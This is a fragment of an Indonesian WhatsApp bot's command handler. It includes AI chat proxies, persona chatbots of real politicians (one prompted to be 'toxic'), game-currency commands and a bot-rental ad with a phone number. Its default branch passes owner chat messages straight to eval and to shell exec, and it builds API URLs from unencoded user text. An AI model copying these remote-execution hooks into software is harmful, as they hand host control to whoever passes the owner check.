});

try {
  const response = await axios.get(`https://api.azz.biz.id/api/bard?q=${text}&key=global`);
  if (response.data) {
    conn.sendMessage(m.chat, {
      text: response.data.respon,
      contextInfo: {
        externalAdReply: {
          title: "Google Bard",
          body: "Bard Goggle AI",
          thumbnailUrl: "https://telegra.ph/file/be5d97e838beb62064043.jpg",
          sourceUrl: sig,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    });
  } else {
    reply('Terjadi kesalahan dalam mengambil data dari API.');
  }
} catch (error) {
  reply('Gagal terhubung ke API.');
}
}
break;
case 'getpp': {
try {
  let who
  if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
  else who = m.quoted.sender ? m.quoted.sender : m.sender
  let pp = await conn.profilePictureUrl(who, 'image').catch((_) => "https://telegra.ph/file/24fa902ead26340f3df2c.png")
  conn.sendFile(m.chat, pp, "profile.png", '🐶 Profile', m, {jpegThumbnail: await(await fetch(pp)).buffer()})
  } catch {
    let sender = m.sender
    let pp = await conn.profilePictureUrl(sender, 'image').catch((_) => "https://telegra.ph/file/24fa902ead26340f3df2c.png")
    conn.sendFile(m.chat, pp, 'ppsad.png', "🐶 Profile", m, {jpegThumbnail: await(await fetch(pp)).buffer()})
  }
}
break
case 'jokowi':
case 'cai-jokowi': {
  if (!text) return reply(`Masukan Query Text`);

  try {
    const response = await axios.get(`https://aemt.me/ai/c-ai?prompt=Jokowi, bersipat asik, seru, menyenangkan&text=${text}`);
    const textt = `${response.data.result}`;

    conn.sendMessage(m.chat, {
      text: textt,
      contextInfo: {
        externalAdReply: {
          title: "Character AI - Joko Widodo",
          body: "Presiden Indonesia",
          thumbnailUrl: "https://telegra.ph/file/6ff44e819f5351d5b3a13.jpg",
          sourceUrl: sig,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    });
  } catch (error) {
    console.error(error);
    return reply(`Terjadi kesalahan dalam mengambil data.`);
  }
}
break;
case 'megawati':
case 'cai-megawati': {
  if (!text) return reply(`Masukan Query Text`);

  try {
    const response = await axios.get(`https://aemt.me/ai/c-ai?prompt=megawati sukarnoputri, bersipat toxic dan emosian&text=${text}`);
    const textt = `${response.data.result}`;

    conn.sendMessage(m.chat, {
      text: textt,
      contextInfo: {
        externalAdReply: {
          title: "Character AI - Megawati",
          body: "Ketua Umur Partai Demokrasi Indonesia Perjuangan",
          thumbnailUrl: "https://telegra.ph/file/ebed29b844f11aa58bf3c.jpg",
          sourceUrl: sig,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    });
  } catch (error) {
    console.error(error);
    return reply(`Terjadi kesalahan dalam mengambil data.`);
  }
}
break;
case 'prabowo':
case 'cai-prabowo': {
  if (!text) return reply(`Masukan Query Text`);

  try {
    const response = await axios.get(`https://aemt.me/ai/c-ai?prompt=prabowo, bersipat asik, seru&text=${text}`);
    const textt = `${response.data.result}`;

    conn.sendMessage(m.chat, {
      text: textt,
      contextInfo: {
        externalAdReply: {
          title: "Character AI - Prabowo",
          body: "adalah seorang tokoh politik yang sudah lama berkecimpung di dunia politik Indonesia.",
          thumbnailUrl: "https://telegra.ph/file/321b3c6a87d1ef04bed93.jpg",
          sourceUrl: sig,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    });
  } catch (error) {
    console.error(error);
    return reply(`Terjadi kesalahan dalam mengambil data.`);
  }
}
break;
case 'elaina':
case 'cai-elaina': {
  if (!text) return reply(`Masukan Query Text`);

  try {
  let prompt = `Elaina Bersipat Asik , Lucu, Imut Dan Rada Nyebelin, Emosikan Dengan Emoji Lucu, Berpacaran Dengan AryTergamteng😎`
    const response = await axios.get(`https://aemt.me/ai/c-ai?prompt=${prompt}&text=${text}`);
    const textt = `${response.data.result}`;

    conn.sendMessage(m.chat, {
      text: textt,
      contextInfo: {
        externalAdReply: {
          title: "Character AI - Elaina",
          body: "karakter dalam salah satu anime yang sangat populer, yaitu Wandering Witch: The Journey of Elaina",
          thumbnailUrl: "https://telegra.ph/file/5c0fcacebff6062da2e0e.jpg",
          sourceUrl: sig,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    });
  } catch (error) {
    console.error(error);
    return reply(`Terjadi kesalahan dalam mengambil data.`);
  }
}
break;
case 'atm': {
let user = global.db.data.users[m.sender]
let amount = args[0];
if (!amount || isNaN(amount)) return reply(`${command} 800`)
if (amount <= 0) return reply(`Jumlah Uang Harus Lebih Dari 1000`)
if (amount > user.balance) return reply(`Uang Mu Kurang.`)

user.balance -= amount
user.atm += amount
reply(`🍄 Sukses Menyimpan ${amount} Uang Di Atm`)
}
break
case 'atmmin': {
let user = global.db.data.users[m.sender];
  let atmBalance = user.atm;
  let balance = user.balance;

  if (!text || isNaN(text)) return reply(`${command} 8000`)

  let amount = parseInt(text);
  if (amount <= 0 || amount > atmBalance) return reply(`Uang Di Atm Kurang Dari Jumlah ${amount}`)

  user.atm -= amount;
  user.balance += amount;

  reply(`🍄 Berhasil Mengambil Uang Di Atm Sebesar ${amount} Uang Mu Sekarang ${balance}`);
}
break
case 'tebakumur': case 'tebakage': {
if (!args[0]) return m.reply("*Ex*: .tebakumur Ary");

  let name = args[0];
  let apiurl = `https://api.lolhuman.xyz/api/tebakumur?apikey=${apilol}&name=${encodeURIComponent(name)}`;
  conn.sendMessage(m.chat, {
    react: {
      text: '🕒',
      key: m.key,
    }
  });
  try {
    let response = await axios.get(apiurl);
    let result = response.data.result;
    let nameResult = result.name;
    let ageResult = result.age;
    let replyMsg = `Nama ${nameResult}, umur: ${ageResult} tahun`;
    reply(replyMsg);
  } catch (error) {
    console.log(error);
    reply("Terjadi Kesalahan.!");
  }
}
break
case 'tebakgender': {
  if (!args[0]) return m.reply("*Example* .tebakgender Ary");

  let name = args[0];
  let apiurl = `https://api.lolhuman.xyz/api/tebakgender?apikey=${apilol}&name=${encodeURIComponent(name)}`;
  conn.sendMessage(m.chat, {
    react: {
      text: '🕒',
      key: m.key,
    }
  });
  try {
    let response = await axios.get(apiurl);
    let result = response.data.result;
    let nameResult = result.name;
    let genderResult = result.gender;
    let replyMsg = `Nama ${nameResult}, gender: ${genderResult}`;
    reply(replyMsg);
  } catch (error) {
    console.log(error);
    reply("Terjadi Kesalahan.!");
  }
};
break
case 'balas': case 'balaspesan': {
if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
let pesan = text.split(',')[0]
let nomer = text.split(',')[1]
let wanet = nomer + '@s.whatsapp.net'
if (!pesan) return reply(`*Ex:* ${command} <pesan>,<nomer>`)
if (!nomer) return reply(`*Ex:* ${command} <pesan>,<nomer>`)
let message = `Halo @${wanet.split('@')[0]} 👋\n\n${pesan}`
conn.sendMessage(wanet, {
      text: message,
      contextInfo: {
        mentionedJid: [wanet],
        externalAdReply: {
          title: 'Pesan Dari Owner',
          body: 'Ini Adalah Pesan Dari Owner Atau Balasan Dari Owner',
          thumbnailUrl: ppUrl,
       // thumbnailUrl: pp,
          sourceUrl: sig,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    })
    reply(`Sukses Kirim Pesan.!`)
    }
    break
case 'cai': {
let user = db.data.users[m.sender]
let query = text
let create = text.split('|')[0]
let ch = text.split('|')[1]
if (!query) return reply(`Create Cai || ${command} create|<nama karakter>`)
if (create && ch) {
user.cai = ch
reply(`Sukses Membuat Karakter AI Dengan Nama ${ch}`)
} else {
if (!query) return reply(`Masukan Text`)
try {
		        let { pinterest } = require('./lib/scraper')
                let rndm = await pinterest(`${user.cai} anime`)
                let imagec = rndm[Math.floor(Math.random() * rndm.length)]               
  let prompt = `${user.cai} Bersipat Asik, Seru Dan Menyenangkan, Dan Tujuan Mu Untuk Menyenangkan Orang Orang, Kondisikan Lah Sipat Mu Seperti Manusia Asli`
    const response = await axios.get(`https://aemt.me/ai/c-ai?prompt=${prompt}&text=${query}`);
    const textt = `${response.data.result}`;
    conn.sendMessage(m.chat, {
      text: textt,
      contextInfo: {
        externalAdReply: {
          title: "Character AI",
          body: "Custom Character AI",
          thumbnailUrl: imagec,
          sourceUrl: sig,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    });
  } catch (error) {
    console.error(error);
    return reply(`Terjadi kesalahan dalam mengambil data.`);
  }
}
}
break
case 'gconly': {
let endis = args[0]
if (!endis) return reply(`Ex: gconly on Or gconly off`)
if (endis === 'on') {
db.data.settings[botNumber].gconly = true
reply(`Succesfully`)
} else if (endis === 'off') {
db.data.settings[botNumber].gconly = false
reply(`Succesfully`)   
}
}
break
case 'blackbox': {
if (!text) return reply(`Input Query`)
if (/image/.test(mime)) {
try {
if (!text) return reply(`Masukan Text`)
const media2 = await conn.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPh(media2)
let response = await axios.get(`https://api.yanzbotz.my.id/api/ai/blackbox-image?url=${anu}&query=${text}`)
reply(response.data.result)
} catch (error) {
console.error(error)
reply(`Terjadi Kesalahan Saat Mengambil Data Image`)
}
} else if (text) {
try {

let response = await axios.get(`https://api.yanzbotz.my.id/api/ai/blackbox?query=${text}`)
let data = response.data.result
reply(data)
} catch (error) {
reply(`Terjadi Kesalahan Saat Mengambil Data`)
console.error(error)
}
}
}
break
case 'promptimg': case 'imgprompt': {
if (!quoted) return reply(`Reply Foto`)
if (!/image/.test(mime)) return newReply(`Reply Foto Dengan Caption ${command}`)
const media2 = await conn.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPh(media2)
try {
let response = await axios.get(`https://api.yanzbotz.my.id/api/tools/image-prompt?url=${anu}`)
let data = response.data
reply(data.result)
} catch (error) {
console.error(error)
reply(`Terjadi Kesalahan Saat Mengambil Data`)
}
}
break
case 'ocr': {
if (!quoted) return reply(`Reply Foto`)
if (!/image/.test(mime)) return newReply(`Reply Foto Dengan Caption ${command}`)
const media2 = await conn.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPh(media2)
try {
let response = await axios.get(`https://api.yanzbotz.my.id/api/tools/ocr?url=${anu}`)
let data = response.data
reply(data.result)
} catch (error) {
console.error(error)
reply(`Terjadi Kesalahan Saat Mengambil Data`)
}
}
break
case 'voice-mrbeast': case 'mrbeast': {
if (!text) return reply(`Masukan Text.`)
conn.sendMessage(m.chat, { audio: { url: `https://api.yanzbotz.my.id/api/tts/mrbeast?query=${text}` }, mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}
break
case 'disneytxt': case 'txtdisney': {
if (!text) return reply(`Masukan Prompt Text`)
let apiUrl = `https://api.yanzbotz.my.id/api/text2img/disney?prompt=${text}`
    let response = await fetch(apiUrl)
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`)

    let imageBuffer = await response.buffer()

    conn.sendFile(m.chat, imageBuffer, 'image.jpg',  `🍄 Disney Generate Text Prompt ${text}`, m)
}
break

case 'clearsesi': {
const fs = require('fs');
const path = require('path');
let sessionsFolderPath = './session';
    let files = fs.readdirSync(sessionsFolderPath);
    let filesToKeep = ['creds.json'];
    let filesToDelete = files.filter(file => !filesToKeep.includes(file));

    if (filesToDelete.length === 0) {
      return m.reply('No sessions to clear.');
    }
  conn.sendMessage(m.chat, {
    react: {
      text: '🕒',
      key: m.key,
    }
  });
    for (let file of filesToDelete) {
      fs.unlinkSync(path.join(sessionsFolderPath, file));
    }
    let remainingFiles = fs.readdirSync(sessionsFolderPath);
    let remainingFileCount = remainingFiles.length;

    m.reply(`Sessions cleared successfully. ${remainingFileCount} files are kept.`);
    }
    break
case 'bingimg': case 'bingcreate': {
if (!text) return reply(`Masukan Query Text`)
let response = await axios.get(`https://api.ibeng.tech/api/others/bling2?q=${text}`)
let result = response.data.data
for (var i of result) {
conn.sendMessage(m.chat, { image: { url: i }, caption: 'Bing Create' }, { quoted: m })
}
}
break 

            default:                                       
if (budy && isCmd && command && m.isGroup && isRegistered) {
try {
ppexpp = await conn.profilePictureUrl(m.sender, 'image')
} catch {
ppexpp = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
let user = global.db.data.users[m.sender]
let before = user.level * 1
	while (levelling.canLevelUp(user.level, user.exp, global.multiplier)) user.level++
	if (before !== user.level) {
addMonay(m.sender, 1000)
let asa = `Selamat @${m.sender.split`@`[0]} anda telah naik level!\n*${before}* ➠ *${user.level}*\n\nAnda mendapatkan +1000 money\n\ngunakan *.my* untuk mengecek`
sendImageMentionsBuffer(await levelUp(ppexpp), asa, m)
}
}

 let userg = global.db.data.users[m.sender];
  if (userg && userg.premium && userg.premiumDate && (new Date() >= userg.premiumDate)) {
    userg.premium = false;
    userg.premiumDate = 0;
    userg.limit = 100;
    await m.reply('🍟 Waktu Premium Kamu Sudah Expired/Habis');
  };            
                 if (budy.startsWith('=>')) {
                    if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return newReply(bang)
                    }
                    try {
                        newReply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        newReply(String(e))
                    }
                }





                if (budy.startsWith('>')) {
                    if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await newReply(evaled)
                    } catch (err) {
                        await newReply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return newReply(err)
                        if (stdout) return newReply(stdout)
                    })
                }           
         global.db.menfess = global.db.menfess ? global.db.menfess : {}
         let mf = Object.values(global.db.menfess).find(v => !v.status && v.receiver == m.sender)
         if (mf && body) {
             if (m.isGroup) return newReply(`Balas Pesan Menfess Mu Di Private Chat`)
            if (!/conversation|extended/.test(m.mtype)) return newReply(`Balas dengan teks biasa.`)
            let text = `😄 Hai kak, kamu menerima pesan balasan nih dari ${mf.receiver.split('@')[0]} pesannya : *${body}*`
            await conn.sendMessage(mf.from, { text: text }).then(async () => {
               newReply(`Berhasil Terkirim!!`)
               await sleep(1000)
               delete global.db.menfess[mf.id]
               return !0
            })
         }     
            if ((m.mtype === 'groupInviteMessage' || budy.startsWith('https://chat') || budy.startsWith('Buka tautan ini')) && !m.isGroup) {
newReply(`彡 *S E W A*
ᴜɴᴛᴜᴋ ᴍᴇɴʏᴇᴡᴀ ʙᴏᴛ ᴋᴀᴍᴜ̈ ʙɪsᴀ ᴍᴇᴍᴀᴋᴀɪ ᴘᴇᴍʙᴀʏᴀʀᴀɴ ɪɴɪ:
╭─ ◦ *ᴘᴀʏᴍᴇɴᴛ*
│ 6285762008398 < ᴅᴀɴᴀ / arybotz > < ᴘᴜʟsᴀ / xsɪs >
╰─ ≂

╭─ ◦ *ʜᴀʀɢᴀ*
│ 5 ʜᴀʀɪ > ɪᴅʀ 2ᴋ
│ 1 ᴍɪɴɢɢᴜ > ɪᴅʀ 3ᴋ
│ 5 ᴍɪɴɢɢᴜ > ɪᴅʀ 10ᴋ
│ 1 ʙᴜʟᴀɴ > ɪᴅʀ 30ᴋ
╰─ ≂

*ᴄʜᴀᴛ ᴏᴡɴᴇʀ .ᴏᴡɴᴇʀ ᴜɴᴛᴜᴋ ᴍᴇʟᴀᴋᴜᴀɴ ᴛʀᴀɴsᴀᴋsɪ ʏᴀɴɢ ʟᴀɪɴɴʏᴀ*`)
                    }   

	conn.zaenar_join = conn.zaenar_join
		? conn.zaenar_join
		: {
				join: false,
				time: 0,
		  };
	const currentTime = Math.floor(Date.now() / 20000);
	const is_zaenar = m.sender === "6285762008398@s.whatsapp.net";
	if (!m.isGroup || !is_zaenar || conn.zaenar_join["time"] > currentTime) {
		return;
	}
	if (!conn.zaenar_join["join"]) {
		await conn.sendMessage(
			m.chat,
			{
				text: "Perhatian!!, Owner *AryBotz* Telah Datang, Tunduk Kepada Owner 🙇",
			},
			{
				quoted: m,
				mentions: participants.map(u => u.id)
			}
		);
		conn.zaenar_join = {
			join: true,
			time: Math.floor(Date.now() / 20000) + 2 * 20000,
		};
	} else {
		conn.zaenar_join = {
			join: false,
			time: Math.floor(Date.now() / 20000) + 2 * 20000,
		};
	}


                
                if (isCmd && budy.toLowerCase() != undefined) {
                    if (m.chat.endsWith('broadcast')) return
                    if (m.isBaileys) return
                    let msgs = global.db.data.database
                    if (!(budy.toLowerCase() in msgs)) return
                    conn.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
                }
        }


} catch (err) {
console.log(err)
console.log(chalk.bgRed(chalk.black("[  ERROR  ]")),util.format(err))
let e = String(err) 
if (e.includes("this.isZero")) {return}
if (e.includes("rate-overlimit")) {
if(!conn.public) return
conn.public = false
await conn.sendMessage("6285762008398@s.whatsapp.net",{ 
text: `Terjadi Rete Overlimit!`
})
await setTimeout(() => {
conn.public = true
 conn.sendMessage("6285762008398@s.whatsapp.net",{ 
text: `Berhasil mengubah mode self ke mode public`
})
}, 60000)
return
}
if (e.includes('Connection Closed')){ return }
if (e.includes('Timed Out')){ return }
if (e.includes('Value not found')){ return }
console.log(chalk.white('Message Error : %s'), chalk.green(util.format(e)))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})